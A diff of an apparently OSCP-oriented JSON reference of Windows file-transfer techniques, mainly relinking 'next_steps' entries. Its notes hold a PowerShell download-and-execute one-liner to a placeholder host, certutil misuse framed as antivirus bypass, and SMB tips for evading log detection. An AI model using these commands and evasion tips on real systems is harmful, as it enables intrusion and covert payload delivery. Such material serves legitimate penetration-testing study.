@@ -77,7 +77,7 @@
         "ft-bitsadmin-download"
       ],
       "next_steps": [
-        "ft-base64-decode",
+        "ft-base64-encode",
         "ft-smb-download"
       ],
       "notes": "OSCP METHODOLOGY: First choice for Windows downloads. Certutil is a legitimate Windows certificate management tool, so it's often whitelisted by AV and application whitelisting solutions. Living-off-the-land binary (LOLBin).\n\nMANUAL ALTERNATIVE: Copy/paste file contents if very small, or use ft-vbscript-download on ancient systems.\n\nWHY IT WORKS: Windows admins rarely block certutil because it's used for legitimate certificate operations. Defenders often miss it in logs.\n\nEXAM TIP: If initial shell is cmd.exe, this is your fastest download method. Test immediately after getting shell. Can also encode/decode Base64: certutil -encode in.exe out.txt && certutil -decode out.txt restored.exe\n\nCOMMON GOTCHA: Leaves cache artifacts in C:\\Users\\<USER>\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\n\nTIME ESTIMATE: 2-10 seconds for typical tools (100KB-10MB). Faster than PowerShell for small files.",
@@ -231,9 +231,7 @@
         "ft-powershell-iwr",
         "ft-certutil-download"
       ],
-      "next_steps": [
-        "ft-powershell-execute-memory"
-      ],
+      "next_steps": [],
       "notes": "OSCP METHODOLOGY: Fastest PowerShell download method for large files (>10MB). Uses .NET directly instead of PowerShell cmdlets, reducing overhead. No progress indicator - silent execution.\n\nMANUAL ALTERNATIVE: Could use WinHTTP or BITS COM objects, but WebClient is simplest.\n\nIN-MEMORY VARIANT: For in-memory execution without touching disk: IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')\n\nEXAM TIP: Use this for large payloads (Mimikatz, Rubeus, etc.) where speed matters. Remember the filename in output path - easy to forget and get errors.\n\nVS INVOKE-WEBREQUEST: WebClient is 2-5x faster for files >10MB, no IE dependency, but less features (no -UseBasicParsing issues).\n\nTIME ESTIMATE: 2-5 seconds for tools under 5MB, faster than IWR and comparable to certutil.",
       "oscp_relevance": "high"
     },
@@ -307,9 +305,7 @@
         "ft-certutil-download",
         "ft-powershell-webclient"
       ],
-      "next_steps": [
-        "ft-smb-execute-direct"
-      ],
+      "next_steps": [],
       "notes": "OSCP METHODOLOGY: Fastest transfer method for Windows targets on internal network. 10-100x faster than HTTP for large files (>10MB). Port 445 often allowed internally even when HTTP egress is blocked.\n\nMANUAL ALTERNATIVE: Mount share persistent: net use Z: \\\\<IP>\\share then access as Z:\\ drive.\n\nDIRECT EXECUTION: Can run tools directly from share without copying: \\\\<IP>\\share\\winPEAS.exe > output.txt (saves disk space, leaves less artifacts)\n\nEXAM TIP: If HTTP download fails or is slow, immediately try SMB. On newer Windows (10+), you'll need authenticated SMB - setup with -username/-password flags on impacket-smbserver.\n\nSECURITY EVASION: SMB transfers are harder to detect in logs than HTTP downloads (blends with normal network file sharing).\n\nTIME ESTIMATE: Near-instant for files under 50MB on local network, limited only by network speed.",
       "oscp_relevance": "high"
     },
